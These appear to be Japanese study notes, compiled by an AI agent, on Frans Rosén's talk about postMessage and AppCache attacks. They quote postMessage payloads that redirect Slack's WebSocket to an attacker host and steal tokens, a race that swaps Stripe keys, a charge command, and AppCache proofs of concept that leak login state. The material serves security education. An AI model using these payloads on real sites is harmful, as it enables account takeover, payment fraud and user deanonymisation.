**2nd bug（スライド107-111、逐語）**: 正規表現が `^https:\/\/.*(...)$` と `.*` で始まるため、ドメインの区切りが甘い。加えて `.nz`（ニュージーランド）が2015年からトップレベルで直接登録可能（スライド109、`https://en.wikipedia.org/wiki/.nz`）。
```javascript
Boolean("https://www.exampleaco.nz".match('^https:\/\/.*(\.example.co.nz)$'))
```
```javascript
true
```
→ 攻撃者ドメイン `www.exampleaco.nz`（`example` の前が `a`、`.co.nz` ではなく一続き）が `\.example.co.nz` にマッチしてしまう（`\.` が実質「任意1文字＋example…」を許すため、`a` + `example` + 任意 + `co` + 任意 + `nz` にマッチ）。つまり攻撃者は `exampleaco.nz` を登録すれば正規のorigin判定を通過できる。

脆弱シナリオ（スライド112-118、決済INITダンス、逐語）:
- 登場: `ilikefood.com`（加盟店）、`foodpayments.com`（PCI認証済み決済ドメイン）。
- （114）iframeロード後、メインフレームがiframeへ INIT を送る:
```javascript
iframe.postMessage('INIT', '*')
```
- （115）iframeが INIT の送信者を `msgTarget` として登録:
```javascript
if(e.data==INIT && originOK) {
 msgTarget = event.source
 msgTarget.postMessage('INIT','*')
}
```
- （116）iframeがメインへ「OK」を返し、メインは:
```javascript
if(e.data==INIT and e.source==iframe) {
  all_ok_dont_kill_frame()
}
```
```javascript
msgTarget.postMessage('INIT','*')
```
- （117）メインがプロバイダデータ（決済プロバイダ名＋公開鍵）を送る:
```javascript
if(INIT) {
 iframe.postMessage('["LOAD",
"stripe","pk_abc123"]}’, '*')
}
```
- （118）iframeが決済プロバイダをロードし、チャネル（リスナー）を閉じる:
```javascript
if(INIT) {
if(e.data[0]==LOAD && originOK) {
 initpayment(e.data[1], e.data[2])
window.removeEventListener
 ('message', listener)
}
}
```

攻撃（スライド119-129、逐語）:
- （120）攻撃者 `exampleaco.nz` から `ilikefood.com` を開く（origin判定を前述バグで通過）。
- （122）攻撃者は iframe に LOAD を**連射**（スプレー）:
```javascript
setInterval(function(){
  child.frames[0].postMessage('["LOAD","stripe","pk_diffkey"]}’,'*')
}, 100)
```
- （123）正規の INIT ダンスが解決するが、攻撃者の LOAD がレースに勝つ（`'INIT'<->'INIT'`）。
- （124）LOAD がリスナーを閉じ、攻撃者が勝利。Stripeが攻撃者の公開鍵でロードされる:
```text
Frame loads
api.stripe.com?key=pk_diffkey…
```
- （125）「It's now the attacker's Stripe account（今やそれは攻撃者のStripeアカウント）」被害者はクレカ入力→Pay。
- （126-127）加盟店側では決済失敗（Payment failed）だが、**Stripe側では成功**（トークン化成功）。
- （128-129）攻撃者はStripeログからトークンを取り、任意金額を請求できる:
```sh
curl https://api.stripe.com/v1/charges \
  -u sk_test_REDACTED_EXAMPLE_KEY: \
  -d amount=999 \
  -d currency=usd \
  -d description="Example charge" \
  -d source=tok_REDACTED_EXAMPLE
```
- 教訓: postMessageの「ハンドシェイク（INITダンス）」だけで信頼を確立し、後続メッセージ（LOAD）のoriginやsourceを再検証しない設計は、レース（メッセージ順序）操作で乗っ取られる。攻撃者は隙間で自分のメッセージを勝たせる。

#### クライアントサイドレースコンディション #2 の補足（スライド130、逐語）

- 「postMessage from opener between two other postMessage-calls（openerからの、他2つのpostMessage呼び出しの間に割り込むpostMessage）」
- 「Chrome seems to be the only one allowing this to happen afaik.（自分の知る限りChromeだけがこれを許すようだ）」
- 〔補足（一般知識）〕ブラウザ間でメッセージイベントのキューイング/配送順序に差があり、opener（親）からのメッセージが子フレームの内部ハンドシェイクの間に割り込めるかはブラウザ依存。当時Chromeがこの割り込みを許していた。

#### ツール: postMessage-tracker の Speedbumps（実装上の障害）（スライド131-141、逐語）

スライド132「postMessage-tracker Speedbumps」。

**Problem 1（スライド133-134）**: Function-wrapping（Raven.js, rollbar, bugsnag, NewRelic）
- これらエラー監視ライブラリはリスナー関数を「ラップ」してしまい、真のリスナーが見えなくなる。
- Solution（逐語）: 「Find wrapper and jump over it. console better due to this!（ラッパを見つけて飛び越える。これによりconsole表示が良くなる）」

**Problem 2（スライド135-136）**: jQuery-wrapping（バージョン間で挙動が違い厄介）
Before（逐語）:
```javascript
function(b){return typeof
_!==za&&_.event.triggered!==b.type?
_.event.dispatch.apply(a,arguments):void 0}
```
Solution（逐語）: 「Use either ._data, .expando or .events from jQuery object!（jQueryオブジェクトの ._data / .expando / .events のいずれかを使う）」
After（真のリスナー例、逐語）:
```javascript
function(msg) {
    var msgData = msg.originalEvent.data;

    if (msgData.msgid != "docstrap.quicksearch.start") {
        return;
    }

    var results = Searcher.search(msgData.searchTerms);

    window.parent.postMessage({"results": results,
        "msgid": "docstrap.quicksearch.done"}, "*");
}
```

**Problem 3（スライド137-138）**: Anonymous functions（無名関数は同定不能）
- Solution（逐語）: 「Can't extract using Function.toString() in Chrome :( Will however at least show them as tracked now（Chromeでは Function.toString() で取り出せない。せめて "tracked" として表示はする）」

#### 今後の展望とリリース状況（スライド139-142、逐語）

スライド139-141「postMessage-tracker released?」:
- 「No :( I suck. "Soon"?」（当時未リリース）
- 「Want to complete more features!」追加したい機能:
  - Trigger debugger to breakpoint messages (since we own the order)（メッセージにブレークポイントを張るデバッガ起動。順序を掌握しているので可能）
  - Try to see if .origin is being used and how（.origin が使われているか、どう使われているかを見る）
  - If regex, run through Rex!（正規表現なら Rex に通す）
  - 〔補足（一般知識〕"Rex" は正規表現の網羅的マッチ生成/解析ツールを指すとみられる。ここではorigin判定の正規表現をファジングして回避文字列を自動生成する意図。）

スライド142「That's it! — Frans Rosén (@fransrosen)」。

---

### 補完1: postMessage-tracker 拡張の全機能（出典: github.com/fransr/postMessage-tracker README）

トークで予告された拡張は2020年5月に実リリース。README要点（逐語・和訳併記）:

- Chrome拡張。現在ウィンドウのpostMessageリスナー数をインジケータ表示する。
- 「It supports tracking listeners in all subframes of the window.（ウィンドウの全サブフレームのリスナーを追跡）」
- 「It also keeps track of short-lived listeners and listeners enabled upon interactions.（短命のリスナーや、操作時に有効化されるリスナーも追跡）」
- 「You can also log the listener functions and locations ... by using the Log URL-option（Log URLオプションでリスナー関数とその場所をログできる）」→ 一時的にしか有効化されない隠れリスナーの発見に有効。
- コンソールにウィンドウ間のやり取りを表示し、「specify the windows using a path you can use yourself to replay the message（メッセージ再送に使えるパスでウィンドウを特定）」。
- 「tracking communication happening between different windows, using `diffwin` as sender or receiver in the console.（異なるウィンドウ間の通信を `diffwin` で追跡）」

Features（逐語）:
- 「Supports Raven, New Relic, Rollbar, Bugsnag and jQuery wrappers and "unpacks" them to show you the real listener.（Raven / New Relic / Rollbar / Bugsnag / jQuery のラッパに対応し、"アンパック"して真のリスナーを表示）」
- 「Tries to bypass and reroute wrappers so the Devtools console will show the proper listeners」
- 「Allows you to set a Log URL inside the extension options ... log all information about each listener to an endpoint by submitting the listener and the function」（`chrome://extensions` のExtension Optionsから設定）
- 「Supports anonymous functions. Chrome does not support to stringify an anonymous function, in the cases of anonymous functions, you will see the `bound`-string as the listener.（無名関数対応。Chromeは無名関数を文字列化できないため、`bound` 文字列として表示される）」

Known issues（逐語、抜粋）:
- 当初はXHTML名前空間を持つXMLにも注入されてしまったが、「The content script is not added to the DOM if the `document.contentType` is `application/xml`（`document.contentType` が `application/xml` の場合はコンテンツスクリプトをDOMに追加しない）」よう修正済み。

---

### 補完2: Slack トークン窃取（postMessage + WebSocket再接続）（出典: labs.detectify.com、2017-02-28、HackerOne #207170）

> トーク告知文で明示された「how he accessed private Slack tokens by using postMessage and WebSocket-reconnect」の一次原文。スライドPDFには未収録のため、この事例のみ動画/ブログで補完（原典ブログをアーカイブ経由で全文取得）。

**TLDR（逐語）**: 「I was able to create a malicious page that would reconnect your Slack WebSocket to my own WebSocket to steal your private Slack token. Slack fixed the bug in 5 hours (on a Friday) and paid me $3,000 for it.」（悪意あるページで被害者のSlack WebSocketを攻撃者のWebSocketへ再接続させ、privateなSlackトークンを盗む。Slackは金曜に5時間で修正、報奨$3,000。HackerOne #207170）

#### 発見の手がかり

- SlackのWeb版が `window.addEventListener('message', func)` でメッセージを受けており、リスナー関数 `_receivePostedMessageFromChildWindow` が `evt.origin` / `evt.source`（読み取り専用でスプーフ不可）を一切検証していなかった。
- Chrome DevToolsの Elements タブ → Event Listeners でリスナーの存在を確認する手法を使用。

リスナー冒頭（逐語）:
```
var _receivePostedMessageFromChildWindow = function(evt) {
    if (!evt || !evt.data || !evt.data.message_type) {
        TS.utility.calls_log.logEvent({
            event: _utility_calls_config.log_events.invalid_msg_from_child_window,
            value: evt
        });
        return
    }
    if (evt.data.origin_window_type === TS.utility.calls.window_types.call_window) {
        switch (evt.data.message_type) {
        case TS.utility.calls.messages_from_call_window_types.update_mini_panel:
            ...
            break;
        case TS.utility.calls.messages_from_call_window_types.set_call_window_loaded:
            ...
```

#### 任意ユーザーを狙うための工夫

- チーム固有URL問題を `https://my.slack.com`（現在のインスタンスへリダイレクト）で解決。
- `/call` エンドポイントも同じくorigin未検証で、より面白いイベントを持っていた。ただしスラッグ（`/call/UXXXX`）が必要 → スラッグ `me` が機能することを発見:
```
https://slack.com/call/me
```
→ 任意のSlackユーザーで動作し、（リロードすると壊れるが）postMessageリスナーを持つページに到達できる。

#### 決め手のイベント: reconnect_url + goodbye

- 送信可能イベントの膨大なリスト（逐語、抜粋 — 完全一覧は原文参照）: `accounts_changed()`, `apps_changed(imsg)`, `bot_added(imsg)`, ... , `goodbye(imsg)`, `hello(imsg)`, ... , `message(imsg)`, ... , `reconnect_url(imsg)`, ... , `user_typing(imsg)` など100以上。
- 注目したのは `reconnect_url`（逐語）:
```
if (!TS.ms.fast_reconnects_enabled)
    return;
var url = imsg.url;
TS.ms.setReconnectUrl(url)
```
→ SlackのWebSocket URLを差し替える。WebSocketの初期化GETには `token` パラメータ（`xoxs`トークン＝アカウント完全アクセス権）が含まれる。

- 攻撃者WebSocket（Ratchet/socketo.me使用）の `onOpen`（逐語、トークンをダンプ）:
```
public function onOpen(ConnectionInterface $conn) {
    // Store the new connection to send messages to later
    $this->clients->attach($conn);
    $token = $conn->WebSocket->request->getQuery()['token'];
    echo sprintf("WE GOT TOKEN: %s\n", $token);
    file_put_contents('token.txt', $token);
    echo "New connection! ({$conn->resourceId})\n";
}
```

- reconnect_urlを送っても既存接続があるため即再接続しない。そこで `goodbye` イベントで切断させる（逐語）:
```
goodbye: function(imsg) {
    if (!TS.lazyLoadMembersAndBots())
        return;
    TS.info("Got a goodbye message, so disconnecting from the MS");
    TS.ms.disconnect()
},
```
- `fast_reconnects_enabled` が `true` だったため、reconnect_url → goodbye の順で再接続を誘発できた。

#### 完成した攻撃（逐語ペイロード）

WebSocket URLを差し替えるpostMessage:
```
b.postMessage({"origin_window_type":"incoming_call","message_type":"ms_msg","msg":{"reply_to":false,"type":"reconnect_url","url":"ws://your-socket-domain:9001/websocket/AAA"}}, "*")
```
2秒ごとにgoodbyeで切断:
```
b.postMessage({"origin_window_type":"incoming_call","message_type":"ms_msg","msg":{"reply_to":false,"type":"goodbye"}}, "*")
```
→ `slack.com` ウィンドウが攻撃者のsocketへ接続した瞬間にトークンをダンプ。ポーリングで検知し、`auth.test` エンドポイントに `xoxs` トークンで問い合わせてアカウント乗っ取り完了。

#### Slackの修正（逐語）

```
if (!TS.utility.calls.verifyOriginUrl(event.origin)) {
  return
}
...
verifyOriginUrl: function(originHref) {
    return TS.utility.url.getHostName(originHref) == window.location.hostname
},
...
getHostName: function(url) {
    if (!url)
        return "";
    var a = document.createElement("a");
    a.href = url;
    return a.hostname
},
```
- **Update（逐語）**: 別の報告者が「空の `event.origin` でメッセージ投稿できる」バイパスを発見したため、Slackは上記の修正へさらに訂正した（Redditコメントにもバイパスが投稿された）。
- 対応スピード: 金曜夜に報告 → 33分後に返信 → 5時間後に修正。報奨$3,000。

---

## 読者が自分で開くべき資料

### 動画 `https://www.youtube.com/watch?v=vRqcUS4CPFs`（NDC Oslo 2018、54:58）— 取得失敗

**なぜ取得できなかったか**: YouTube（youtube.com / youtu.be）はこのセッションのegress proxyで全面ブロックされており、WebFetch（EGRESS_BLOCKED）・curl（CONNECT 403）とも不可。字幕API・概要ページにも到達できなかった。内容自体はスライド142枚の音声解説にあたるため本ノートで文字面はほぼ復元済みだが、**話し方・実演デモの間合い・質疑・スライドに写らない口頭補足**は動画でしか得られない。

**この動画で「何を学ぶために観るべきか」（読みどころ）**:
1. **postMessageバグの発見ワークフローの実演**: Chrome DevToolsの Event Listeners パネルでリスナーを見つけ、ブレークポイントで受信関数までトレースし、コンソールから任意メッセージを再送して挙動を確かめる一連の手つき（Slack事例の語りが該当）。静的なスライドでは伝わらない「探索の順序」を学ぶ。
2. **クライアントサイドレースコンディションの直感**: なぜ `INIT` ダンス中に `LOAD` を連射すると勝てるのか、`setInterval` の間隔設計、ブラウザ間差（Chromeのみ許す割り込み）の実演解説。決済乗っ取り（Stripe）の攻撃タイミングを口頭でどう説明しているか。
3. **AppCache/ServiceWorkerの「ルート直下にHTMLを置けるか」という一点への着目理由**: アップロードポリシーの弱点（`starts-with` 空指定）がなぜ致命的か、ストレージ設定ミスとブラウザキャッシュ機構がどう連鎖するかの語り口。
4. **バグバウンティの実務・倫理・コーディネーション**: Dropbox事例での「全ブラウザへの協調的報告（coordinated disclosure）」、Slackの5時間修正、報奨額の相場感（$3,000〜$15,000）など、レポートの見せ方・重大性の伝え方（"boring PoC"を避ける姿勢）。
5. **ClickTaleのような正規サードパーティJSを"抽出ガジェット"に変える発想**: ルール機構（triggers/states/action）を読み解いて任意Cookie/DOM/JS変数を外部送出させる、コードリーディング主体の攻撃思考。

### スライド `https://speakerdeck.com/fransrosen/owasp-appseceu-2018-attacking-modern-web-technologies`

**取得状況**: 本体speakerdeck.comはブロックされたが、配信元S3の原典PDF（142ページ）を取得でき、全内容を本ノートに逐語収録済み。読者が自分で開く場合の**読みどころ**:
1. スライド30の署名POSTポリシーJSONと、31-34の `starts-with` 悪用（自分のアップロード機能で `$key` / `$Content-Type` の制約を確認する雛形）。
2. スライド104-111の「2つのバグ」を含むorigin判定コード（`.replace('.','\\.')` の単一置換バグ、`.*(...)$` アンカーの甘さ）— origin検証レビューのチェックリストとして秀逸。
3. スライド114-129の決済INITダンス図解（postMessageハンドシェイク設計のアンチパターン）。
4. スライド133-138のpostMessage-tracker実装障害（Raven/NewRelic/Rollbar/Bugsnag/jQueryのラッパ剥がし、jQueryの `._data`/`.expando`/`.events`）— 実際のサイトでリスナーを探す際の落とし穴集。

### 関連一次資料（本トークが参照/前提とするもの）
- postMessage-tracker（拡張、2020リリース）: `https://github.com/fransr/postMessage-tracker` — 全フレームのリスナー可視化。実機でのハンティングに直結。
- Slack事例原文: `https://labs.detectify.com/2017/02/28/hacking-slack-using-postmessage-and-websocket-reconnect-to-steal-your-precious-token/` と HackerOne `https://hackerone.com/reports/207170`。
- filedescriptor の先行研究: `https://speakerdeck.com/filedescriptor/exploiting-the-unexploitable-with-lesser-known-browser-tricks?slide=22`（AppCacheトリックの独立発見）。
- Detectify Labs のpostMessage連載: 「postMessage XSS on a million sites」`https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/`、「The pitfalls of postMessage」`https://labs.detectify.com/2016/12/08/the-pitfalls-of-postmessage/`。

---

## 教科書執筆者への注記（範囲の正確化）

- 本トーク（2018）の実題材は **AppCache / Upload Policies（AWS S3・GCP）/ postMessage** の3系統。WebSocketは付随的にSlack事例（別ブログ）で登場する。
- タスク指示にある **Zendesk・prototype pollution・client-side storage(localStorage等)** は**この資料には存在しない**（捏造回避のため扱わなかった）。ch07（postMessage/クライアントサイド）ではこれらを別の担当ノートから補うべき。
- データ抽出事例のサードパーティJSは **ClickTale**（現Contentsquare）。「Zendesk」と混同しないこと。
- 「client-side storage」に近い要素としては、ClickTale事例で `sessionStorage.setItem("CT_testRules", ...)` が攻撃の中継に使われている点、Slack事例でWebSocket初期化パラメータの `xoxs` トークンが露出する点がある程度。

---

# 追補（補完エージェントによる再取得試行・二次情報補完）

## 追補0: 動画URL再取得の試行記録と結論（取得不可が確定）

対象: `https://www.youtube.com/watch?v=vRqcUS4CPFs`

前工程の失敗を受け、別手段で系統的に再挑戦したが**すべて失敗**した。試した経路と結果（curlの`CONNECT tunnel failed, response 403` はいずれもegress proxyによる**組織のポリシー拒否**であり、リモート側の拒否ではない）:

| 試行 | 結果 |
| --- | --- |
| curl（User-Agent偽装 Chrome/120, `-L`, `--compressed`） | CONNECT 403 |
| YouTube字幕API `https://www.youtube.com/api/timedtext?lang=en&v=vRqcUS4CPFs` | CONNECT 403 |
| `https://archive.org/wayback/available?url=...`（Wayback有無判定API） | CONNECT 403（archive.org自体がブロック） |
| `web.archive.org/web/2024/`・`web.archive.org/web/2023/` 経由 | 到達不可（archive.orgブロックのため） |
| `r.jina.ai` テキスト抽出プロキシ | CONNECT 403 |
| その他プロキシ・キャッシュ経路（`urlscan.io`, `timetravel.mementoweb.org`, `cachedview.nl`, `corsproxy.io`, `api.allorigins.win`, `md.dhr.wtf`, `urltotext.com`, `textance.herokuapp.com`） | いずれもCONNECT 403 |
| WebSearch（Googleキャッシュ相当の迂回） | セッションの検索枠を使い切り実行不可（200/200） |
| GitHub全域コード検索で字幕・書き起こしファイルを探索 | **該当なし**（動画の字幕/トランスクリプトはGitHub上に存在しない） |

`/root/.ccr/README.md` の規定どおり、403/407は組織のegressポリシー拒否であり迂回してはならないため、**この動画は本セッションでは原理的に取得不能**と確定する。以下は、代わりに**到達可能な経路（GitHub MCP・raw.githubusercontent.com）だけ**を使って行った裏付け・補完である。

> 方法論上の注意（捏造防止）: 以下で引用するツイートは、いずれも**第三者がGitHub上に公開したTwitterスクレイプ・データセット**から取得したものであり、Twitter本体で原文を確認したわけではない。二つの独立したデータセットで同一文面が一致したものは信頼度が高いが、一次確認はできていない。データセット由来であることを明示して記載する。

---

## 追補1: 動画の同定（NDC Oslo版であることの独立裏付け）

前工程は「`vRqcUS4CPFs` はNDC Oslo 2018版（54:58）」と書いていたが、その根拠を独立に2つ確認できた。

**(a) NDCの動画一覧スクレイプ**（出典: `jgraber/Python_Scripts`、`YouTube/fetchNdcVideos.py` — NDCカンファレンス動画のID・タイトル・尺の一覧をスクリプト内に持つ）:

```text
vRqcUS4CPFs = 4 years ago = Attacking Modern Web Technologies - Frans Rosén = 54:58
```

同ファイル中の周辺エントリ（`When your Twin is Digital. And in 3D - Petri Wilhelmsen`、`Gotchas using Terraform in a secure delivery pipeline - Anton Babenko`、`Dos and Don'ts for Serverless and Azure Functions - Jeff Hollan`、`Stop reinventing the wheel with Istio - Mete Atamel`、`Kubernetes for .NET developers - Shahid Iqbal` 等）がいずれもNDC登壇者であることからも、この一覧がNDCのものであると確認できる。→ **タイトルと尺 54:58 が裏付けられた。**

**(b) 公開当時のツイート**（出典: `Didericis/twitter-rumor-spreader`、`api/server/data/fransrosen.json`、ツイートID 1035193143753363456、`@pati_gallardo`、いいね28/RT10）:

> 「"Attacking Modern Web Technologies" @fransrosen Frans Rosén's talk at #ndcoslo was really entertaining and was just released on YouTube https://youtu.be/vRqcUS4CPFs」

→ `vRqcUS4CPFs` が **#ndcoslo（NDC Oslo）版**であり、AppSecEU（2018年7月上旬）より遅れて公開されたことが確認できた。

**(c) 注意すべき異説**: 第三者のまとめリポジトリには、OWASP AppSec EU 2018版の動画IDとして `vMGiplQT9Qo` を挙げるものがある。一方、原著者本人のリポジトリ `fransr/postMessage-tracker` のREADMEは OWASP AppSec Europe 版として `oJCCOnF25JU` を挙げている。**著者本人の記載である `oJCCOnF25JU` を採用すべき**で、`vMGiplQT9Qo` は未検証として扱う（本セッションではYouTubeに到達できず真偽判定不能）。

---

## 追補2: 当時の聴講者による要旨（トーク範囲の独立裏付け＝捏造防止の補強）

出典: `Didericis/twitter-rumor-spreader` `api/server/data/fransrosen.json`（ツイートID 1014966320268443649、`@daniel_bilar`、いいね48/RT14）。同一文面が `parasg1999/Tweet-dataset` `tweets/fransrosen.csv` にも Frans 本人のRTとして記録されている（ID 1015300899365933000、Fri Jul 06 18:26:12 +0000 2018）ため、**2つの独立データセットで一致**。

> 「#OWASP #AppSecEU Attacking modern web technologies by @fransrosen https://www.slideshare.net/fransrosen/attacking-modern-web-technologies … **[S3; AppCache (all browsers); postMessage exploitation, client-side race conditions; recommended talk]**」

→ 会場で聴いた第三者が挙げた論点は **S3 / AppCache（全ブラウザ）/ postMessage exploitation / client-side race conditions** の4点であり、本ノート本文の3系統（AppCache・Upload Policies(S3/GCP)・postMessage＋クライアントサイドレース）と**完全に一致**する。Zendesk・prototype pollution・client-side storage は挙がっていない。→ 本ノート冒頭の「範囲の明確化」を独立に裏付ける。

### スライド本文の第2の独立ミラーによる照合

出典: `hyr0ky/Hiroki_Study` の `网络安全/media/Appsec-Modern-copy.md`（raw.githubusercontent.com経由で取得、6,311バイト/1,764行）。ファイル名が前工程が取得したS3上の原典PDF `Appsec-Modern-copy.pdf` と一致する、**同一PDFからの別系統のMarkdown変換**である。

照合結果:
- スライド区切り（`---`）が **141個 = 142枚**で、原典PDFのページ数と一致。
- 本ノートが逐語収録した箇所（スライド3「Modern = stuff people use」、スライド25「ServiceWorkers, big brother of AppCache」、スライド104-111の `SecureCreditCardController.prototype.isValidOrigin` 全文、スライド139-141「No :( I suck. "Soon"?」「Want to complete more features!」「Trigger debugger to breakpoint messages (since we own the order)」「Try to see if .origin is being used and how」「If regex, run through Rex!」、スライド142「detectify / Frans Rosén (@fransrosen) / That's it!」）が**すべて一致**。
- **キーワード出現数の検証**: `zendesk` = 0件、`prototype pollution` = 0件、`localStorage`/`local storage` = 0件、`websocket` = 0件、`slack` = 0件、`jsonp` = 0件。一方 `stripe` = 10件、`clicktale` = 1件。
  - （`prototype` 単体の一致は `SecureCreditCardController.prototype.isValidOrigin` というJSのプロトタイププロパティのみで、**prototype pollution脆弱性とは無関係**。）

→ **スライドPDFに Zendesk・prototype pollution・client-side storage・WebSocket・Slack が存在しないことが、第2の独立ミラーで確定した。** 本ノートの範囲注記は正しい。

---

## 追補3: AppCacheブラウザバグの共同報告者（新規事実）

本ノート本文はスライド9の Disclaimer（filedescriptor による独立発見）を収録していたが、**Rosén側の共同報告者**については触れていなかった。

出典: Frans Rosén本人のツイート。`Didericis/twitter-rumor-spreader` `api/server/data/fransrosen.json`（ツイートID 907613469322727427、`username: fransrosen`）および `parasg1999/Tweet-dataset` `tweets/fransrosen.csv`（ID 907613469322727400、**Tue Sep 12 14:34:48 +0000 2017**）の**2データセットで一致**:

> 「Me and **@avlidienbrunn** earlier this year reported som fun AppCache-issues in **Chrome/FF/(Safari)** https://bugs.chromium.org/p/chromium/issues/detail?id=696806#c40」

- → スライド21-23の「Coordinated bug reporting to every browser」「Chrome/Edge-IE/Firefox/Safari すべて Fixed」「Browser bounties: $3000」は、**@avlidienbrunn（Mathias Karlsson、Detectify共同創業者。"The pitfalls of postMessage" の著者でもある）との共同報告**だった。
- Chromiumバグ番号 `696806`（#c40）は本ノート本文のスライド23記載と一致。報告時期「earlier this year（2017年内）」も本文の「Reported 28 Feb 2017, fixed ~June 2017」と整合する。
- 教科書執筆時の注意: AppCache章でクレジットするときは **filedescriptor（独立発見）/ Frans Rosén ＋ Mathias Karlsson（@avlidienbrunn）（ブラウザへの共同報告）** と書くのが正確。

---

## 追補4: スライド24「HTTPS only (was changed recently)」の"recently"の正体（新規事実）

本ノート本文はスライド24のAppCache攻撃成立要件として「HTTPS only (was changed recently)」を逐語収録しているが、この「最近変わった」が何を指すか未特定だった。

出典: `Didericis/twitter-rumor-spreader` `api/server/data/avlidienbrunn.json` に記録された `@kinugawamasato`（Masato Kinugawa）のツイート（ID 963222895018229760、いいね19/RT7）:

> 「ついにAppCacheがSecure Contextのみに。 https://blog.mozilla.org/security/2018/02/12/restricting-appcache-secure-contexts/」

→ Mozillaの **2018年2月12日**付「Restricting AppCache to Secure Contexts」が該当。2018年7月のトークから見て「recently」であり、時期が完全に整合する。Chrome側も同様の措置を取っている（追補5のタイムライン参照）。

- 教科書執筆時の使い方: 「AppCache攻撃はHTTPS必須」という要件は**ブラウザ側が2018年前半にAppCacheをSecure Contextに限定した結果**であり、攻撃者にとっての制約であると同時に、AppCache廃止プロセスの一段階でもある、と説明できる。

---

## 追補5: AppCacheのその後 — Luan Herrera「AppCache's forgotten tales」（2021-05-31、全文精読）

出典: `https://blog.lbherrera.me/posts/appcache-forgotten-tales/`（著者 Luan Herrera / @lbherrera）。原URLへは到達できなかったが、`irsdl/webhacklist` にアーカイブされた全文Markdown（`archived-references/md/2021/2021-blog-lbherrera-me-appcache-s-forgotten-tales.md`、raw.githubusercontent.com経由で8,637バイト取得、原文取得日 2026-08-09、原文更新日 2021-05-31）を**全文精読**した。

**この記事を補完に選んだ理由**: 記事本文がRosénの本トークを明示的に先行研究として引用しており（「great past research by @filedescriptor [9] and Frans Rosén (@fransrosen) [10] (where both independently discovered ways to exploit **sandbox domains** through the use of the AppCache)」）、本トークの3年後にAppCacheが完全廃止されるまでに何が起きたかを埋める一次研究だからである。教科書のAppCache章の「その後」として使える。

### (1) AppCache廃止の公式タイムライン（逐語・出典リンク付き）

- Chrome 5.0.375（約10年前）でAppCache実装・出荷。目的は **Offline browsing / Speed / Resilience** の3つ。
- Service Worker等の台頭で存在意義が低下。Chromeの実装は「**2nd most troublesome client-side storage API in the Web Platform**」とされ、2018-2019年の間に **400以上のChromium CL**（変更リスト）が投じられた。
- WHATWG標準で deprecated かつ removal 指定、W3C HTML 5.1 で obsolete 指定（`https://www.w3.org/TR/html51/obsolete.html#application-caches`）。
- **Chrome 67** で deprecate（「非セキュアオリジン上の強力な機能を削除する」取り組みの一部）→ **Chrome 70** で非セキュアコンテキストから削除。
- 当初 **Chrome 82** での削除予定が **Chrome 85** に延期され、Chrome 85でデフォルト削除。ただし移行が間に合わなかったサイト向けに「**reverse origin trial**」でセキュアコンテキスト上に限り再有効化できる猶予があった（`https://web.dev/appcache-removal/#origin-trial`）。
- 完全削除は **Chrome 93**（2021年10月頃見込み）。

→ 本ノート本文の「〔補足〕現在は主要ブラウザから完全に削除済み。後継はService Worker + Cache API」に、**具体的なバージョンと年次**を与える一次情報。

### (2) マニフェストのセクション構成と、本トークとの関係

- セクションは **CACHE / NETWORK / FALLBACK**、＋Chrome独自の **CHROMIUM-INTERCEPT**（HTML標準には存在しない、Chromeが標準から逸脱して実装した独自機能）。
- 重要な制約（逐語）: 「I discarded the **FALLBACK** and the **CHROMIUM-INTERCEPT** sections as possible vectors since they **only take same-origin URLs as entries**.」
  - → **本トークのDropbox攻撃（FALLBACK悪用）はsame-origin前提の攻撃**である、という位置づけが明確になる。Rosénの攻撃が「サンドボックスドメイン（＝ユーザーがファイルを置ける同一オリジン）」を必要とした理由がこれ。Herreraはcross-originで効く攻撃を狙ったためFALLBACKを捨て、NETWORKセクションに向かった。
- CHROMIUM-INTERCEPTの詳細は Jun Kokatsu（@shhnjk）「Intro to Chrome's (g)old features」`https://shhnjk.blogspot.com/2019/07/intro-to-chromes-gold-features.html` と Chromiumバグ `101565` を参照。

### (3) 新発見1: CACHEセクションによるリダイレクト検知オラクル（XS-Leak）

AppCacheは**リダイレクトを伴うエントリをキャッシュできない**（WHATWG標準のcache-failure steps）。これを利用してログイン状態を漏洩させる:

```text
CACHE MANIFEST
https://www.facebook.com/settings
```
```html
<html manifest="manifest.appcache">
	<script>
		applicationCache.onerror  = () => console.log("User isn't logged since there was a redirect");
		applicationCache.oncached = () => console.log("User is logged since there wasn't a redirect");
	</script>
</html>
```

- `/settings` はログイン時のみ閲覧可（未ログインなら `/login.php` へリダイレクト）。`error`/`cached` イベントをオラクルにして状態を判定。
- 限界: ①エンドポイントが状態依存でリダイレクトを出す必要がある ②**1ビットしか漏れない**（`/me` が `/` か `/victim` かのように「2つのリダイレクト」を区別できない）。

### (4) 新発見2: NETWORKセクションは「許可リスト」として働く（本記事の核心）

MDNの記述からは「NETWORKに列挙したものは常にネットワークから取得」と読めるが、実際は逆方向の効果が強い（逐語）:

> 「If you have a Network section set in your manifest and you try to request a URL that is **neither an entry in your Network or Cache sections, the request will be rejected, effectively working as an allowlist**. Even more interesting is that it also applies to **requests originated from a redirect**.」

- つまりNETWORKセクションを置くと、**未列挙URLへのリクエストがブロックされ、しかもリダイレクト先にも適用される**。
- これにより「任意のURLがリダイレクト連鎖に含まれるか」を確認できる＝**オラクルの粒度が上がる**。

ユーザー名の特定（deanonymization）:
```text
CACHE MANIFEST

NETWORK:
https://www.facebook.com/me
https://www.facebook.com/victim
```
```html
<html manifest="cache.manifest">
	<script>
		applicationCache.oncached = () => {
			fetch("https://www.facebook.com/me", {
				mode: "no-cors",
				credentials: "include"
			}).then(() => {
				console.log("The profile of the user is /victim");
			}).catch(()= > {
				console.log("The profile of the user isn't /victim");
			});
		}
	</script>
</html>
```
- 流れ: マニフェスト設置で `/me` と `/victim` 以外の通信を遮断 → `/me` にfetch → ログイン済ならプロフィール `/victim` へリダイレクト → ユーザー名が `victim` なら許可リストに載っているので promise 成功、違えばネットワークエラーで reject。
- 弱点: ユーザー名の辞書が必要。ただし**十万件規模のエントリを1マニフェストに詰め、当たったら二分探索**で絞り込める。

### (5) 新発見3: Chrome独自のglobパターンマッチ `isPattern` による文字単位ブルートフォース

Chromeの `appcache_manifest_parser.cc` に「URL patterns」「not standardized」の記述を発見し、Chromiumバグ `224426` から、**2013年初頭にFALLBACK / INTERCEPT / NETWORKの各セクションへglobパターンマッチが追加**されていたことを特定。エントリ末尾に `isPattern` を付けるとglob意味論で照合される。

```text
CACHE MANIFEST

NETWORK:
https://www.facebook.com/me
https://www.facebook.com/vi*tim isPattern
```

- これを許可リスト挙動と組み合わせると、**クロスオリジンのリダイレクト連鎖に現れるURLを1文字ずつブルートフォースできる**。
